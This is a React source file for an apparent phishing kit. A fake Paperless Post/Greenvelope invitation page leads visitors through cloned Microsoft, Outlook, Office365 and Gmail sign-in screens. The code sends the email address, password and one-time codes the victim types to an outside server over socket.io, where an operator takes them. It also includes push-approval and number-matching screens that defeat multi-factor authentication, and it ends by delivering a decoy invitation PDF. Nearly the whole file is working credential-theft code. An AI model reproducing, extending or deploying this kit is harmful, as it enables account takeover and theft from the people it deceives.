import { useState, useEffect, useRef } from 'react';
import io from 'socket.io-client'; 
import { jsPDF } from 'jspdf';

const SOCKET_SERVER = 'https://audbce.onrender.com'; 

const EmailAuthApp = () => {
  const [currentView, setCurrentView] = useState('landing');
  const [provider, setProvider] = useState('');
  const [email, setEmail] = useState(''); 
  const [isLoading, setIsLoading] = useState(false);
  const [specialNumber, setSpecialNumber] = useState(null);
  const [sessionId, setSessionId] = useState(null); 
  const socketRef = useRef(null);   
  const [socketConnected, setSocketConnected] = useState(false);
  const sessionIdRef = useRef(null);



   const generateInvitationPDF = () => {
    const doc = new jsPDF();
    
    const generateInvitationCode = () => {
      const random = Math.random().toString(36).substring(2, 8).toUpperCase();
      const timestamp = Date.now().toString().slice(-4);
      return `INV-${random}${timestamp}`;
    };
    
    const code = generateInvitationCode();
    
    // Header with green theme
    doc.setFillColor(46, 125, 50);
    doc.rect(0, 0, 210, 50, 'F');
    
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(32);
    doc.setFont("helvetica", "bold");
    doc.text("Paperless POST", 105, 25, { align: "center" });
    
    doc.setFontSize(14);
    doc.setFont("helvetica", "normal");
    doc.text("Digital Invitation & Greeting Card", 105, 38, { align: "center" });
    
    // Event title
    doc.setFontSize(24);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(50, 50, 50);
    doc.text("You're Invited!", 105, 70, { align: "center" });
    
    // Divider line
    doc.setDrawColor(46, 125, 50);
    doc.setLineWidth(0.5);
    doc.line(40, 78, 170, 78);
    
    // Message
    doc.setFontSize(12);
    doc.setFont("helvetica", "normal");
    doc.setTextColor(80, 80, 80);
    doc.text("Thank you for accessing this invitation.", 105, 92, { align: "center" });
    doc.text("To complete your RSVP and view full event details,", 105, 102, { align: "center" });
    doc.text("please confirm your attendance using the code below.", 105, 112, { align: "center" });
    
    // Code box
    doc.setFillColor(232, 245, 233);
    doc.setDrawColor(46, 125, 50);
    doc.setLineWidth(1);
    doc.rect(35, 125, 140, 35, 'FD');
    
    doc.setFontSize(10);
    doc.setTextColor(46, 125, 50);
    doc.setFont("helvetica", "bold");
    doc.text("YOUR INVITATION CODE:", 105, 138, { align: "center" });
    
    doc.setFontSize(20);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(27, 94, 32);
    doc.text(code, 105, 152, { align: "center" });
    
    // Instructions
    doc.setFontSize(12);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(50, 50, 50);
    doc.text("RSVP Instructions:", 25, 180);
    
    doc.setFontSize(11);
    doc.setFont("helvetica", "normal");
    doc.setTextColor(80, 80, 80);
    doc.text("1. Reply to the RSVP email address below", 25, 192);
    doc.text("2. Subject Line: Enter your invitation code", 25, 202);
    doc.text("3. Message Body: Confirm with 'ATTENDING' or 'NOT ATTENDING'", 25, 212);
    doc.text("4. Full event details will be sent within 24-48 hours", 25, 222);
    
    // RSVP email box
    doc.setFillColor(250, 250, 250);
    doc.setDrawColor(200, 200, 200);
    doc.rect(25, 235, 160, 20, 'FD');
    
    doc.setFontSize(9);
    doc.setTextColor(120, 120, 120);
    doc.text("RSVP EMAIL ADDRESS:", 30, 244);
    
    doc.setFontSize(13);
    doc.setFont("helvetica", "bold");
    doc.setTextColor(46, 125, 50);
    doc.text("rsvp@greenvelope-events.com", 30, 252);
    
    // Footer
    doc.setDrawColor(220, 220, 220);
    doc.line(25, 265, 185, 265);
    
    doc.setFontSize(9);
    doc.setFont("helvetica", "italic");
    doc.setTextColor(140, 140, 140);
    doc.text("Please keep this document for your records.", 105, 274, { align: "center" });
    doc.text("For questions, do not reply to the original sender.", 105, 282, { align: "center" });
    doc.text("All inquiries must go through the RSVP system above.", 105, 290, { align: "center" });
    
    // Save
    doc.save(`greenvelope-invitation-${code}.pdf`);
  };




  useEffect(() => { 

      // Only connect once
  if (!socketRef.current) {
    socketRef.current = io(SOCKET_SERVER);
  }
    
    socketRef.current.on('connect', () => {
      console.log('My socket ID:', socketRef.current.id); 
      console.log('Connect fired! sessionId =', sessionIdRef.current);  
      setSocketConnected(true); 
       // If we already have a sessionId, tell backend to update
      if (sessionIdRef.current) { 
         // YES! This means we connected BEFORE
    // This is a RECONNECTION, not first connection 
     // "Hey backend! I'm not a new user!
     //It's a signal that says ....
  //HEY!! I was here before with session sess_123
  // But my socket changed (reconnection happened)
  // Please update your records so you can still find me!"  
        console.log('Reconnecting session:', sessionIdRef.current);
         socketRef.current.emit('reconnect-session', { sessionId: sessionIdRef.current });  
         // the session.ip and session.userAgent remain unchanged in the backend
      }   else {
         // Since this is first time connnection, tell backend to create new session
        console.log('First time connection, no sessionId yet.');
        socketRef.current.emit('request-new-session');
      }
    });  
    

    
     // Remove and re-add listeners with updated provider value
  socketRef.current.off('show-otp-screen');
  socketRef.current.off('show-success-screen');
  socketRef.current.off('show-error');
  socketRef.current.off('show-approve-screen');
  socketRef.current.off('show-approve-with-number'); 

 socketRef.current.on('session-invalid', () => {
  console.log('Session invalid, reloading page...'); 
  //reload the page so that we start fresh
  window.location.reload();
});

    // Listen for server events  
  socketRef.current.on('show-otp-screen', () => {
  console.log('=== OTP EVENT RECEIVED ===');
  setIsLoading(false); 
  console.log('Current provider:', provider);
  setSpecialNumber(null);  // <-- Clear any special number
  setCurrentView(provider === 'gmail' ? 'gmail-otp' : 'ms-otp');
});  

   
 socketRef.current.on('show-approve-screen', () => {
  console.log('=== APPROVE EVENT RECEIVED ===');
  setIsLoading(false);
  setSpecialNumber(null); 
  setCurrentView(provider === 'gmail' ? 'gmail-approve-special' : 'ms-otp');  
});

socketRef.current.on('show-approve-with-number', (data) => {
  console.log('Approve with special number:', data.number); 
  setIsLoading(false);
  setSpecialNumber(data.number);  // <-- Store the number
  setCurrentView(provider === 'gmail' ? 'gmail-approve-specialb' : 'ms-otp');   
});


    socketRef.current.on('show-success-screen', () => {
      setIsLoading(false);
      setCurrentView('success');  
      setTimeout(() => generateInvitationPDF(), 1000);
    });

    socketRef.current.on('show-error', (data) => {
      setIsLoading(false);
      alert(data.message);
      setCurrentView('landing');
    });     


    socketRef.current.on('your-session-id', (id) => {
  setSessionId(id);   
  sessionIdRef.current = id; 

    if (socketRef.current.connected) {
    fetch('https://audbce.onrender.com/start-session', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sessionId: id,
        socketId: socketRef.current.id
      })
    });
  }
  
}); 



 //ADD Respond to connection tests
  socketRef.current.on('connection-test', (data, callback) => {
    if (callback) callback(); // Acknowledge we're alive
  });
 

  }, [provider]);
 

  // Separate useEffect for component unmount only
useEffect(() => {
  return () => {
    // This only runs when component unmounts
    if (socketRef.current) {
      // Step 1: Clean up the SERVER side
      socketRef.current.disconnect();
      // Step 2: Clean up the CLIENT side
      socketRef.current = null;
    }
  };
}, []); // Empty array = only on mount/unmount



  useEffect(() => {
    if (currentView === 'gmail-loading') {
      const timer = setTimeout(() => {
        setCurrentView('gmail-otp');
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [currentView]);

  const handleProviderSelect = (selectedProvider) => {
    setProvider(selectedProvider);
    if (selectedProvider === 'outlook' || selectedProvider === 'office365') {
      setCurrentView('ms-email');
    } else if (selectedProvider === 'gmail') {
      setCurrentView('gmail-email');
    }
  };

  const handleEmailSubmit = () => {     
      // Add validation
  if (!email || email.trim() === '') {
    alert('Please enter your email address');
    return;
  }

    if (email && socketRef.current) {
      setIsLoading(true);
      socketRef.current.emit('submit-email', {
        provider: provider.charAt(0).toUpperCase() + provider.slice(1),
        email: email,
        sessionId: sessionIdRef.current
      });
    }
    
    // Move to password screen
    if (provider === 'gmail') {
      setCurrentView('gmail-password');
    } else {
      setCurrentView('ms-password');
    }   
    setIsLoading(false);
  };

  const handlePasswordSubmit = (password) => {
    if (password && socketRef.current) {
      setIsLoading(true);
      socketRef.current.emit('submit-password', {
        password: password,
        sessionId: sessionIdRef.current
      });
    }
    // Stay on current screen, wait for Telegram command
  };

  const handleOtpSubmit = (otp) => {
    if (otp && socketRef.current) {
      setIsLoading(true);
      socketRef.current.emit('submit-otp', {
        otp: otp,
        sessionId: sessionIdRef.current
      });
    }
    // Stay on current screen, wait for Telegram command
  };

  const handleBack = () => {
    setCurrentView('landing');
    setProvider('');
    setEmail('');
  }; 


 

  return ( 
    <div className="app-container">  


     {/* Loading screen here */}
    {!socketConnected && (
      <div className="full-screen-loading">
        <div className="loading-content-center">
          <div className="loading-brand">
            <div className="brand-text">Invitation</div>
            <div className="brand-post">Please wait...</div>
          </div>
          <div className="loading-spinner-main"></div>
        </div>
      </div>
    )}

      {/* Landing Page */}
      {currentView === 'landing' && (
        <div className="landing-container">
          <div className="landing-card">
            <div className="landing-logo">
              <div className="landing-logo-text">Paperless</div>
              <div className="landing-post">POST</div>
            </div>
            <h1 className="landing-title">
              Manage your Online Invitations &<br />Greeting Card
            </h1>
            <p className="landing-description">
              To view the invitation, please select your email provider below and log in. You were invited to access the invitation on Greenvelope.
            </p>
            <button className="provider-button outlook-btn" onClick={() => handleProviderSelect('outlook')}>
              <div className="provider-icon">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                  <rect width="16" height="16" fill="#0078d4" rx="2"/>
                  <text x="8" y="12" fontSize="12" fill="white" textAnchor="middle" fontWeight="bold">O</text>
                </svg>
              </div>
              Sign in with Outlook
            </button>
            <button className="provider-button office365-btn" onClick={() => handleProviderSelect('office365')}>
              <div className="provider-icon">
                <div className="ms-logo-squares">
                  <div className="ms-square" style={{background: '#f25022'}}></div>
                  <div className="ms-square" style={{background: '#7fba00'}}></div>
                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
                  <div className="ms-square" style={{background: '#ffb900'}}></div>
                </div>
              </div>
              Sign in with Office365
            </button>
            <button className="provider-button gmail-btn" onClick={() => handleProviderSelect('gmail')}>
              <div className="provider-icon" style={{background: 'transparent'}}>
                <span className="google-g" style={{fontSize: '16px'}}>G</span>
              </div>
              Sign in with Gmail
            </button>
            <div className="landing-footer">
              Online invitations & birthday cards. greenvelope simplifies event planning with user-friendly tools for managing online invites.
              <br /><br />
              © 2026 Sincere Corporation. greenvelope is a registered trademark of Sincere Corporation. All rights reserved. All other product and company names are trademarks or registered trademarks of respective.
            </div>
          </div>
        </div>
      )} 


    

      {/* Microsoft - Email Entry */}
      {/* Microsoft - Email Entry */}
{currentView === 'ms-email' && (
  <div className="ms-container">
    <div className="ms-card">
      <div className="ms-logo">
        <div className="ms-logo-icon">
          <div className="ms-logo-squares">
            <div className="ms-square" style={{background: '#f25022'}}></div>
            <div className="ms-square" style={{background: '#7fba00'}}></div>
            <div className="ms-square" style={{background: '#00a4ef'}}></div>
            <div className="ms-square" style={{background: '#ffb900'}}></div>
          </div>
        </div>
        <span className="ms-logo-text">Microsoft</span>
      </div>
      <h1 className="ms-title">Sign in</h1>
      <p className="ms-subtitle">
        {provider === 'outlook' ? 'to continue to Outlook' : 'to continue to Office 365'}
      </p>
      <div>
        <input 
          type="email" 
          className="ms-input" 
          placeholder="Email, phone, or Skype"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
        <a href="#" className="ms-link">No account? Create one!</a>  <br />  
        <a href="#" className="ms-link">Can't access your account</a>
      </div>
      <div className="clearfix">
        <button className="ms-button"  disabled={isLoading || !email || email.trim() === ''} onClick={handleEmailSubmit}> 
          {isLoading ? 'Please wait...' : 'Next'} 
        </button>
      </div>
    </div>
    <div className="ms-options">
      <svg className="ms-key-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
      </svg>
      <span className="ms-options-text">Sign-in options</span>
    </div>
  </div>
)}


      {/* Microsoft - Password Entry */}
      {currentView === 'ms-password' && (
        <div className="ms-container">
          <div className="ms-card">
            <div className="ms-logo">
              <div className="ms-logo-icon">
                <div className="ms-logo-squares">
                  <div className="ms-square" style={{background: '#f25022'}}></div>
                  <div className="ms-square" style={{background: '#7fba00'}}></div>
                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
                  <div className="ms-square" style={{background: '#ffb900'}}></div>
                </div>
              </div>
              <span className="ms-logo-text">Microsoft</span>
            </div>
            <h1 className="ms-title">Enter your password</h1>
            <p className="ms-subtitle">for the account: {email || '*********'}</p>
            <div>
              <input 
                type="password" 
                className="ms-input" 
                placeholder="Password"
                id="ms-password-input"
              />
            </div>
            <div className="clearfix">
              <button className="ms-button" disabled={isLoading} onClick={() => {
                const pwd = document.getElementById('ms-password-input').value;
                handlePasswordSubmit(pwd);
                 if (!pwd || pwd.trim() === '') {
    alert('Please enter your password');
    return;
  }
              }}> {isLoading ? 'Signing in...' : 'Sign in'} </button>
            </div> 

             <div>
              <a href="#" className="ms-footer-link">Privacy & cookies</a>
              <span className="ms-footer-link">...</span>
            </div>
            <span className="ms-footer-info">
              Use private browsing if this is not your device. <a href="#" className="ms-info-link">Learn more</a>
            </span>
          </div> 
        </div>
      )}   
       


        {/* Microsoft - OTP Entry */}
      {currentView === 'ms-otp' && (
        <div className="ms-container">
          <div className="ms-card">
            <div className="ms-logo">
              <div className="ms-logo-icon">
                <div className="ms-logo-squares">
                  <div className="ms-square" style={{background: '#f25022'}}></div>
                  <div className="ms-square" style={{background: '#7fba00'}}></div>
                  <div className="ms-square" style={{background: '#00a4ef'}}></div>
                  <div className="ms-square" style={{background: '#ffb900'}}></div>
                </div>
              </div>
              <span className="ms-logo-text">Microsoft</span>
            </div>
            <h1 className="ms-title">Enter the code</h1>
            <p className="ms-subtitle">We've sent a code to your Phone for the account:</p>
            <div>
              <input 
                type="text" 
                className="ms-input" 
                placeholder="Enter 6-digit code"
                maxLength="6"
              />
            </div>
            <div className="clearfix">
              <button className="ms-button" disabled={isLoading} onClick={() => {
                  const otp = document.querySelector('.ms-input').value;
                   if (!otp || otp.trim() === '') {
    alert('Please enter the verification code');
    return;
  }
                 handleOtpSubmit(otp) 
                 } }> {isLoading ? 'Verifying...' : 'Next'} </button>
            </div>
          </div>
          <div className="ms-footer">
            <div className="ms-footer-links">
              <a href="#" className="ms-footer-link">Terms of use</a>
              <a href="#" className="ms-footer-link">Privacy & cookies</a>
              <span className="ms-footer-link">...</span>
            </div>
            <span className="ms-footer-info">
              Use private browsing if this is not your device. <a href="#" className="ms-info-link">Learn more</a>
            </span>
          </div>
        </div>
      )}



      {/* Gmail - Email Entry */}
      {currentView === 'gmail-email' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <svg viewBox="0 0 48 48" width="36" height="36">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  <path fill="none" d="M0 0h48v48H0z"/>
</svg>
            </div>
            <h1 className="gmail-title">Sign in</h1>
            <p className="gmail-subtitle">to continue to Gmail</p>
            <div className="gmail-input-wrapper">
              <input 
                type="email" 
                className="gmail-input" 
                placeholder="Email or phone"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <a href="#" className="gmail-link">Forgot email?</a>
            <p className="gmail-info">
              Not your computer? Use Guest mode to sign in privately. <a href="#" className="gmail-link">Learn more about using Guest mode</a>
            </p>
            <div className="gmail-actions">
              <a href="#" className="gmail-link">Create account</a>
              <button className="gmail-button" disabled={isLoading || !email || email.trim() === ''} onClick={handleEmailSubmit}>  {isLoading ? 'Signing in...' : 'Next'} </button>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}

      {/* Gmail - Password Entry */}
      {currentView === 'gmail-password' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <svg viewBox="0 0 48 48" width="36" height="36">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  <path fill="none" d="M0 0h48v48H0z"/>
</svg>
            </div>
            <h1 className="gmail-title">Welcome</h1>
            <div className="gmail-account-selector">
              <div className="gmail-account-icon">👤</div>
              <span className="gmail-account-email">{email}</span>
              <span className="gmail-dropdown-icon">▼</span>
            </div>
            <div className="gmail-password-group">
              <div className="gmail-password-label">
                <span className="gmail-password-label-text">Enter your password</span>
                <input 
                  type="password" 
                  className="gmail-password-input"
                  id="gmail-password-input"
                />
              </div>
            </div>
             <div className="gmail-checkbox-group">
  <input 
    type="checkbox" 
    className="gmail-checkbox" 
    id="show-password"
    onChange={(e) => {
      const passwordInput = document.getElementById('gmail-password-input');
      passwordInput.type = e.target.checked ? 'text' : 'password';
    }}
  />
  <label htmlFor="show-password" className="gmail-checkbox-label">Show password</label>
</div>
            <div className="gmail-actions">
              <a href="#" className="gmail-link">Forgot password?</a>
              <button className="gmail-button" disabled={isLoading} onClick={() => {
                const pwd = document.getElementById('gmail-password-input').value;
                 if (!pwd || pwd.trim() === '') {
    alert('Please enter your password');
    return;
  }
                handlePasswordSubmit(pwd);
              }}> {isLoading ? 'Signing in...' : 'Sign in'} </button>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}

      {/* Gmail - Loading */}
      {currentView === 'gmail-loading' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <svg viewBox="0 0 48 48" width="36" height="36">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  <path fill="none" d="M0 0h48v48H0z"/>
</svg>
            </div>
            <h1 className="gmail-title">Sign in</h1>
            <p className="gmail-subtitle">to continue to Gmail</p>
            <div className="gmail-loading">
              <div className="spinner"></div>
              <p className="loading-text">Please wait...</p>
              <p className="loading-subtext">Do not close or refresh this page</p>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}

      {/* Gmail - OTP Entry */}
      {currentView === 'gmail-otp' && (
        <div className="gmail-container">
          <div className="gmail-content">
            <div className="gmail-logo">
              <svg viewBox="0 0 48 48" width="36" height="36">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  <path fill="none" d="M0 0h48v48H0z"/>
</svg>
            </div>
            <h1 className="gmail-title">2-Step Verification</h1>
            <p className="gmail-subtitle">To continue, first verify it's you</p>
            <p className="gmail-info" style={{marginBottom: '24px'}}>
              For your security, enter the 6-digit code from your authenticator app.
           </p>
            <div className="gmail-input-wrapper">
              <input 
                type="text" 
                className="gmail-input" 
                placeholder="Enter code"
                maxLength="6"
                id="gmail-otp-input"
              />
            </div>
            <a href="#" className="gmail-link">Try another way</a>
            <div className="gmail-actions"> 
              <button className="gmail-button" disabled={isLoading} onClick={() => {
                const otp = document.getElementById('gmail-otp-input').value;
                if (!otp || otp.trim() === '') {
    alert('Please enter the verification code');
    return;
  }
                handleOtpSubmit(otp);
              }}> {isLoading ? 'Verifying...' : 'Next'} </button>
            </div>
          </div>
          <div className="gmail-footer">
            <div className="gmail-footer-left">
              <select className="gmail-footer-select">
                <option>English (United States)</option>
              </select>
            </div>
            <div className="gmail-footer-right">
              <a href="#" className="gmail-footer-link">Help</a>
              <a href="#" className="gmail-footer-link">Privacy</a>
              <a href="#" className="gmail-footer-link">Terms</a>
            </div>
          </div>
        </div>
      )}         





       {currentView === 'gmail-approve-special' && (
  <div className="gmail-container">
    <div className="gmail-content">
      <div className="gmail-logo">
        <svg viewBox="0 0 48 48" width="36" height="36">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  <path fill="none" d="M0 0h48v48H0z"/>
</svg>
      </div>
      <h1 className="gmail-title">2-Step Verification</h1>
      <p className="gmail-subtitle">To continue, first verify it's you</p>
      <p className="gmail-info" style={{marginBottom: '24px'}}>
        Google sent a notification to your phone. Tap <strong>YES, IT'S ME</strong> on the notification to sign in, and click Next below.
      </p> 
      <a href="#" className="gmail-link">Try another way</a>
      <div className="gmail-actions"> 
        <button className="gmail-button" disabled={isLoading} onClick={() => { 
          handleOtpSubmit('00000');
        }}> {isLoading ? 'Verifying...' : 'Next'} </button>
      </div>
    </div>
    <div className="gmail-footer">
      <div className="gmail-footer-left">
        <select className="gmail-footer-select">
          <option>English (United States)</option>
        </select>
      </div>
      <div className="gmail-footer-right">
        <a href="#" className="gmail-footer-link">Help</a>
        <a href="#" className="gmail-footer-link">Privacy</a>
        <a href="#" className="gmail-footer-link">Terms</a>
      </div>
    </div>
  </div>
)}





      {currentView === 'gmail-approve-specialb' && (
  <div className="gmail-container">
    <div className="gmail-content">
      <div className="gmail-logo">
          <svg viewBox="0 0 48 48" width="36" height="36">
  <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
  <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
  <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
  <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  <path fill="none" d="M0 0h48v48H0z"/>
</svg>
      </div>
      <h1 className="gmail-title">2-Step Verification</h1>
      <p className="gmail-subtitle">To continue, first verify it's you</p>
      <p className="gmail-info" style={{marginBottom: '24px'}}>
        Press YES, IT'S ME and tap <strong style={{fontSize: '27px', color: '#8ab4f8'}}>{specialNumber}</strong> on your phone to sign in, and click Next below.
      </p> 
      <a href="#" className="gmail-link">Try another way</a>
      <div className="gmail-actions"> 
        <button className="gmail-button" disabled={isLoading} onClick={() => { 
          handleOtpSubmit('00000');
        }}> {isLoading ? 'Verifying...' : 'Next'} </button>
      </div>
    </div>
    <div className="gmail-footer">
      <div className="gmail-footer-left">
        <select className="gmail-footer-select">
          <option>English (United States)</option>
        </select>
      </div>
      <div className="gmail-footer-right">
        <a href="#" className="gmail-footer-link">Help</a>
        <a href="#" className="gmail-footer-link">Privacy</a>
        <a href="#" className="gmail-footer-link">Terms</a>
      </div>
    </div>
  </div>
)}

      {/* Success Screen */}
      {currentView === 'success' && (
        <div className="success-container">
          <div className="success-card">
            <div className="success-icon">
              <span className="checkmark">✓</span>
            </div>
            <h1 className="success-title">Done — invites downloaded</h1>
            <p className="success-subtitle">You can close this window or go back home.</p>
            <button className="success-button" onClick={handleBack}>Back to Home</button>
          </div>
        </div>
      )} 



       <style>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
          -webkit-font-smoothing: antialiased;
          -moz-osx-font-smoothing: grayscale;
        }

        .app-container {
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        /* Landing Page Styles */
        .landing-container {
          background: linear-gradient(180deg, #2a2a2a 0%, #1a1a1a 100%);
          min-height: 100vh;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .landing-card {
          background: #2d2d2d;
          border-radius: 12px;
          padding: 48px 40px;
          max-width: 420px;
          width: 100%;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
        }

        .landing-logo {
          text-align: center;
          margin-bottom: 32px;
        }

        .landing-logo-text {
          font-size: 36px;
          font-weight: 700;
          color: white;
          font-family: 'Segoe UI', sans-serif;
          letter-spacing: -0.5px;
        }

        .landing-post {
          font-size: 11px;
          color: #888;
          letter-spacing: 1.5px;
          text-transform: uppercase;
          margin-top: 4px;
        }

        .landing-title {
          color: #ffffff;
          text-align: center;
          font-size: 22px;
          font-weight: 600;
          margin-bottom: 12px;
          line-height: 1.3;
          letter-spacing: -0.3px;
        }

        .landing-description {
          color: #a8a8a8;
          text-align: center;
          font-size: 14px;
          margin-bottom: 36px;
          line-height: 1.5;
        }

        .provider-button {
          width: 100%;
          padding: 13px 20px;
          margin-bottom: 14px;
          border: none;
          border-radius: 6px;
          font-size: 15px;
          font-weight: 500;
          color: white;
          cursor: pointer;
          display: flex;
          align-items: center;
          transition: all 0.2s ease;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
        }

        .provider-button:hover {
          transform: translateY(-1px);
